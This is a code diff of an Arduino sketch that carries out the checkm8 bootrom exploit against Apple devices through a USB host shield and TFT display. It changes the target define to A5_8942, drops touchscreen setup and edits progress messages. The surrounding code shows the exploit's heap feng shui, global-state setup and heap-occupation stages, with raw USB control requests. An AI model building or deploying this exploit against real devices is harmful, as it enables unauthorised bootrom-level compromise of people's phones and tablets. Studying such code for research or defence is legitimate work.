@@ -1,3 +1,4 @@
+#include <SPI.h>
 #include <TouchScreen.h>
 #include <Arduino_DataBus.h>
 #include <Arduino_G.h>
@@ -11,18 +12,11 @@
 #include "Usb.h"
 #include <Arduino.h>
 
-#define YP A1  // must be an analog pin, use "An" notation!
-#define XM A2  // must be an analog pin, use "An" notation!
-#define YM 9   // can be a digital pin
-#define XP 8   // can be a digital pin
-
-
-TouchScreen ts = TouchScreen(XP, YP, XM, YM, 300);
 
 // Создаем объект дисплея
 MCUFRIEND_kbv tft;
 
-#define A5_8940
+#define A5_8942
 #include "constants.h"
 
 USB Usb;
@@ -134,26 +128,22 @@ void loop() {
         }
         checkm8_state = CHECKM8_HEAP_FENG_SHUI;
         Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
-        tft.println(" Run checkm8 exploit.......! ");
         break;
       case CHECKM8_HEAP_FENG_SHUI:
         heap_feng_shui();
         checkm8_state = CHECKM8_SET_GLOBAL_STATE;
         Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
-        tft.println(" Run checkm8 exploit...40%! ");
         break;
       case CHECKM8_SET_GLOBAL_STATE:
         set_global_state();
         checkm8_state = CHECKM8_HEAP_OCCUPATION;
         Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
         //while(Usb.getUsbTaskState() != USB_DETACHED_SUBSTATE_WAIT_FOR_DEVICE) { Usb.Task(); }
-        tft.println(" Run checkm8 exploit...60%! ");
         break;
       case CHECKM8_HEAP_OCCUPATION:
         heap_occupation();
         checkm8_state = CHECKM8_END;
         Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
-        tft.println(" Run checkm8 exploit...80%! ");
         break;
       case CHECKM8_END:
         digitalWrite(6, HIGH);
@@ -227,7 +217,8 @@ void set_global_state()
   Serial.println("2. set global state");
   uint8_t tmpbuf[0x40];
   memset(tmpbuf, 0xcc, sizeof(tmpbuf));
-  tft.println(" Run checkm8 exploit.......START%! ");
+  tft.println(); // Пустая строка
+  tft.println(" Run checkm8 exploit...START%! ");
   rcode = Usb.ctrlReq_SETUP(0, 0, 0x21, 1, 0, 0, 0, 0x40);
   //Usb.regWr(rHCTL, bmSNDTOG0);
   rcode = send_out(tmpbuf, 0x40);
